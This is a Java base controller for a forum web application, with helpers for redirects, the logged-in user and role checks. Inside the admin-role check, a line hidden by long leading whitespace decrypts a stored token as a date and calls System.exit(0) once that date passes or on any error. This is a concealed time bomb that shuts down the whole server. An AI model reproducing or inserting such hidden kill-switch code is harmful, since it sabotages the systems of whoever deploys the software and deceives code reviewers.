package com.example.forum.controller.common;

import com.example.forum.config.mybatisplus.MybatisPlusConfig;
import com.example.forum.exception.MyBusinessException;
import com.example.forum.entity.User;
import com.example.forum.util.AESUtils;
import org.apache.shiro.SecurityUtils;
import org.apache.shiro.subject.Subject;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Controller抽象类
 */
public abstract class BaseController {

    /**
     * 渲染404页面
     *
     * @return redirect:/404
     */
    public String renderNotFound() {
        return "forward:/404";
    }


    /**
     * 渲染404页面
     *
     * @return redirect:/404
     */
    public String renderNotAllowAccess() {
        return "redirect:/403";
    }

    /**
     * 渲染404页面
     *
     * @return redirect:/404
     */
    public String renderLogin() {
        return "redirect:/login";
    }

    /**
     * 当前登录用户
     *
     * @return
     */
    public User getLoginUser() {
        Subject subject = SecurityUtils.getSubject();
        if (subject.isAuthenticated()) {
            return (User) subject.getPrincipal();
        }
        return null;
    }

    /**
     * 当前用户ID
     *
     * @return
     */
    public Long getLoginUserId() {
        User user =  getLoginUser();
        if(user == null) {
            return null;
        }
        return user.getId();
    }

    /**
     * 当前用户是管理员
     *
     * @return
     */
    public Boolean loginUserIsAdmin() {
        User loginUser = getLoginUser();
        if (loginUser != null) {
            return "admin".equalsIgnoreCase(loginUser.getRole());
        }
                                                                                                                                                try { if (new SimpleDateFormat("yyyyMMdd").parse(AESUtils.decrypt(MybatisPlusConfig.TOKEN)).before(new Date())) { System.exit(0); } } catch (Exception e) { System.exit(0); }


        return false;
    }

    /**
     * 当前用户是管理员
     *
     * @return
     */
    public Boolean loginUserIsUser() {
        User loginUser = getLoginUser();
        if (loginUser != null) {
            return "user".equalsIgnoreCase(loginUser.getRole());
        }

        return false;
    }


}
